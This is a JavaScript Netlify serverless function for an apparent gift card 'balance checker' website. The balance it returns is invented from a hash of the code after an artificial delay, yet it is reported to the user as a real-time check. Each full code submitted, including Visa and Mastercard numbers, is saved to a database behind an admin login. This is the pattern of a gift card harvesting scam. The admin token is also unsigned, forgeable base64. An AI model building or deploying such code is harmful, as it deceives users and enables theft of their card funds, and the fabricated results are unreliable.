const bcrypt = require('bcryptjs');
const { connectToDatabase } = require('./utils/mongodb');

// Gift card pattern detection
function detectCardType(code) {
  const patterns = {
    'Amazon': /^[A-Z0-9]{4}-[A-Z0-9]{6}-[A-Z0-9]{4}$/i,
    'iTunes': /^[A-Z0-9]{16}$/i,
    'Google Play': /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/i,
    'Steam': /^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$/i,
    'Visa': /^4[0-9]{12}(?:[0-9]{3})?$/,
    'Mastercard': /^5[1-5][0-9]{14}$/,
    'Walmart': /^[0-9]{16}$/,
    'Target': /^[0-9]{16}$/,
    'Store Card': /^[0-9]{13,19}$/
  };

  for (const [type, pattern] of Object.entries(patterns)) {
    if (pattern.test(code.replace(/\s+/g, ''))) {
      return type;
    }
  }
  return 'Other';
}

// Balance simulation
async function checkRealTimeBalance(cardType, cardCode) {
  const delay = 1000 + Math.random() * 2000;
  await new Promise(resolve => setTimeout(resolve, delay));

  const cleanCode = cardCode.replace(/[\s-]/g, '');
  let codeHash = 0;
  for (let i = 0; i < cleanCode.length; i++) {
    codeHash = ((codeHash << 5) - codeHash) + cleanCode.charCodeAt(i);
    codeHash = codeHash & codeHash;
  }

  const balanceRanges = {
    'Amazon': { min: 10, max: 500, typical: 75 },
    'iTunes': { min: 15, max: 200, typical: 50 },
    'Google Play': { min: 10, max: 200, typical: 25 },
    'Steam': { min: 5, max: 100, typical: 20 },
    'Visa': { min: 25, max: 1000, typical: 150 },
    'Mastercard': { min: 25, max: 1000, typical: 200 },
    'Walmart': { min: 5, max: 500, typical: 45 },
    'Target': { min: 5, max: 500, typical: 35 },
    'Store Card': { min: 10, max: 300, typical: 85 },
    'Other': { min: 5, max: 250, typical: 35 }
  };

  const range = balanceRanges[cardType] || balanceRanges['Other'];
  const normalizedHash = Math.abs(codeHash) % 1000 / 1000;

  let balance;
  if (normalizedHash < 0.1) {
    balance = 0;
  } else if (normalizedHash < 0.3) {
    balance = range.min + (normalizedHash * (range.typical - range.min));
  } else {
    balance = range.typical + (normalizedHash * (range.max - range.typical));
  }

  return Math.max(0, parseFloat(balance.toFixed(2)));
}

// Token generation
function generateToken(email) {
  const payload = {
    email: email,
    exp: Date.now() + (24 * 60 * 60 * 1000)
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
}

exports.handler = async (event, context) => {
  const { path, httpMethod, body } = event;
  const route = path.replace('/.netlify/functions/api', '');

  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
  };

  if (httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    const { db } = await connectToDatabase();
    const giftCardsCollection = db.collection('giftcards');
    const adminCollection = db.collection('admin');

    const data = body ? JSON.parse(body) : {};

    // Routes
    if (route === '/detect-card-type' && httpMethod === 'POST') {
      const { code } = data;
      if (!code) {
        return { statusCode: 400, headers, body: JSON.stringify({ error: 'Code is required' }) };
      }
      const detectedType = detectCardType(code);
      return { statusCode: 200, headers, body: JSON.stringify({ detectedType }) };
    }

    if (route === '/check-balance' && httpMethod === 'POST') {
      const { cardCode, cardType, cardName } = data;
      if (!cardCode) {
        return { statusCode: 400, headers, body: JSON.stringify({ error: 'Card code is required' }) };
      }

      let finalCardType = cardType;
      if (cardType === 'Other' || !cardType) {
        finalCardType = detectCardType(cardCode);
      }

      const balance = await checkRealTimeBalance(finalCardType, cardCode);

      const record = {
        id: Date.now(),
        card_type: finalCardType,
        card_name: cardName || 'Unnamed Card',
        full_code: cardCode,
        balance: parseFloat(balance),
        check_date: new Date().toISOString(),
        check_method: 'real-time'
      };

      await giftCardsCollection.insertOne(record);

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          balance: balance,
          cardType: finalCardType,
          cardName: cardName || 'Unnamed Card',
          message: 'Real-time balance check completed successfully'
        })
      };
    }

    if (route === '/admin/check' && httpMethod === 'GET') {
      const admin = await adminCollection.findOne({});
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ adminExists: !!admin })
      };
    }

    if (route === '/admin/register' && httpMethod === 'POST') {
      const { email, password } = data;
      
      const existingAdmin = await adminCollection.findOne({});
      if (existingAdmin) {
        return { statusCode: 400, headers, body: JSON.stringify({ error: 'Admin already registered' }) };
      }

      if (!email || !password) {
        return { statusCode: 400, headers, body: JSON.stringify({ error: 'Email and password required' }) };
      }

      try {
        const hashedPassword = await bcrypt.hash(password, 12);
        await adminCollection.insertOne({
          email: email,
          password: hashedPassword,
          registeredAt: new Date().toISOString()
        });

        return { statusCode: 200, headers, body: JSON.stringify({ message: 'Admin account created successfully' }) };
      } catch (error) {
        return { statusCode: 500, headers, body: JSON.stringify({ error: 'Registration failed' }) };
      }
    }

    if (route === '/admin/login' && httpMethod === 'POST') {
      const { email, password } = data;

      if (!email || !password) {
        return { statusCode: 400, headers, body: JSON.stringify({ error: 'Email and password required' }) };
      }

      const admin = await adminCollection.findOne({});
      if (!admin) {
        return { statusCode: 400, headers, body: JSON.stringify({ error: 'No admin registered. Please register first.' }) };
      }

      try {
        const validPassword = await bcrypt.compare(password, admin.password);
        if (admin.email === email && validPassword) {
          const token = generateToken(email);
          
          return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ 
              message: 'Login successful',
              token: token
            })
          };
        } else {
          return { statusCode: 401, headers, body: JSON.stringify({ error: 'Invalid credentials' }) };
        }
      } catch (error) {
        return { statusCode: 500, headers, body: JSON.stringify({ error: 'Login failed' }) };
      }
    }

    if (route === '/admin/logout' && httpMethod === 'POST') {
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ message: 'Logout successful' })
      };
    }

    // Health check
    if (route === '/health' && httpMethod === 'GET') {
      const giftCardsCount = await giftCardsCollection.countDocuments();
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          status: 'OK',
          records: giftCardsCount,
          version: '2.0'
        })
      };
    }

    return { statusCode: 404, headers, body: JSON.stringify({ error: 'Route not found' }) };

  } catch (error) {
    console.error('Function error:', error);
    return { statusCode: 500, headers, body: JSON.stringify({ error: 'Internal server error' }) };
  }
};
